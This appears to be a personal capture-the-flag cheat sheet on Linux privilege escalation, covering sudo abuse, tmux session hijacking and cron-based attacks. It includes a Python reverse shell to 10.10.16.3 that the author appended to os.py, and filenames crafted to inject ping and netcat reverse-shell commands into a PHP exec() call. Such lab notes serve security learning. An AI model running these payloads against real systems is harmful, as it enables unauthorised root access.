# Linux Priv escalation Tips

# ${{\color{purple}Upgrade shell}}\ $

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# ${{\color{purple}Manual testing}}\ $
# ${{\color{green}sudo -l}}\ $

`sudo -l`

![1](https://user-images.githubusercontent.com/123066149/225001578-46a486b7-bf12-44ef-b52d-1408ef34fb1e.PNG)

`sudo -u scriptmanager /bin/bash`

![image](https://user-images.githubusercontent.com/123066149/225002081-e468220b-fddf-493b-a817-7d64b90accc1.png)

# ${{\color{green}tmux}}\ $

``cat .bash_history``

![image](https://user-images.githubusercontent.com/123066149/226274014-d15271f8-178e-4891-9a3a-7e7fba239035.png)

``ps aux | grep -i tmux``

![image](https://user-images.githubusercontent.com/123066149/226274186-eb4fb8f5-1e4b-4752-ac3d-3fe6e9889d3d.png)

``ls -la /.devs/dev_ses``

![image](https://user-images.githubusercontent.com/123066149/226274516-f2a84f6f-121b-44b6-85c2-84cbb944435a.png)

``export TERM=xterm``
``tmux -S /.devs/dev_sess``

![image](https://user-images.githubusercontent.com/123066149/226274864-b5db7a5e-f19f-4854-929f-aa2f491ae328.png)
![image](https://user-images.githubusercontent.com/123066149/226275042-06bc4a86-474e-486f-a4e4-00ac3e2e4950.png)

# ${{\color{green}crontab + lib os}}\ $

``ls /opt``

![image](https://user-images.githubusercontent.com/123066149/227714929-a9d3bf80-7aed-465e-b1cc-0bdc72116b0a.png)

![image](https://user-images.githubusercontent.com/123066149/227715049-c670f729-a237-4a63-b208-826d06931d66.png)

``cd /usr/lib``

![image](https://user-images.githubusercontent.com/123066149/227715097-471f6bf7-c430-4469-9b17-11bd4a4baaa3.png)

### I added a reverse shell to end of the library ``/usr/lib/python2.7/os.py``

``import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.3",4455))
dup2(s.fileno(),0) 
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")``

![image](https://user-images.githubusercontent.com/123066149/227715198-26be459a-977a-4b3d-bd81-e6e10ee4c6c8.png)

### As soon as the crontab runs I am root :

![image](https://user-images.githubusercontent.com/123066149/227715364-37deff06-5fa2-4b2b-94ef-baf5fddc6deb.png)

# ${{\color{green}crontab + exec() fonction }}\ $

### Browsing to the home folder of the user, two files named check_attack.php and crontab.guly are
### found.

![image](https://user-images.githubusercontent.com/123066149/227843320-a1b71d72-746c-4e17-b4f5-86e265ca86f9.png)

### Here are the contents of the check_attack.php file:

![image](https://user-images.githubusercontent.com/123066149/227844068-b8db5212-4a6f-4750-a795-26b2d0caf341.png)

### The script lists files in the /uploads folder and checks if it is valid based on filename. Any invalid
### files are removed using the system exec() function

![image](https://user-images.githubusercontent.com/123066149/227844227-1976b7a1-48f0-4c01-a085-fb9797b432de.png)

### The $value variable stores the filename, but isn’t sanitized by the script, which means that we can
### inject commands through special file names. For example, a file named “; cmd” will result in the
### command:

![image](https://user-images.githubusercontent.com/123066149/227844740-539c6b45-6e74-4567-9540-b191b026b398.png)

``touch -- ';ping -c 3 10.10.16.3;.php'``

![image](https://user-images.githubusercontent.com/123066149/227845494-d10710e3-4933-48f8-8e2c-a21432e1a0c5.png)

![image](https://user-images.githubusercontent.com/123066149/227846087-d38a33ba-4258-4c9c-89fe-eb9ec5c5e2cc.png)

``touch -- ';nc -c sh 10.10.16.3 5000;.php'``

![image](https://user-images.githubusercontent.com/123066149/227846212-c4f52290-2b68-48bb-b91a-4d7130e08c0d.png)

#### Looking at the sudo privileges, we see that guly can execute changename.sh as root.

![image](https://user-images.githubusercontent.com/123066149/227846847-5740d7e8-5a43-4e94-9b37-bdc8bd2fe270.png)

https://seclists.org/fulldisclosure/2019/Apr/24

``sudo -l``

![image](https://user-images.githubusercontent.com/123066149/227845992-a2b2c4a3-fb09-461b-bcb1-4d12bec8eec1.png)

### The script creates a configuration for the guly0 network interface and uses “ifup guly0” to
### activate it at the end. The user input is validated, and only alphanumeric characters, slashes or a
### dash are allowed. Network configuration scripts on CentOS are vulnerable to command injection
### through the attribute values as described here. This is because the scripts are sourced by the
### underlying service, leading to execution of anything after a space.
### We can exploit this by executing /bin/bash as root



# ${{\color{purple}Script}}\ $
# ${{\color{green}LinPeas}}\ $

https://github.com/carlospolop/PEASS-ng/releases/tag/20230319

# ${{\color{green}LinEnum}}\ $

https://github.com/rebootuser/LinEnum

# ${{\color{green}Linux-Exploit-Suggester}}\ $

https://github.com/The-Z-Labs/linux-exploit-suggester

# ${{\color{purple}}}\ $

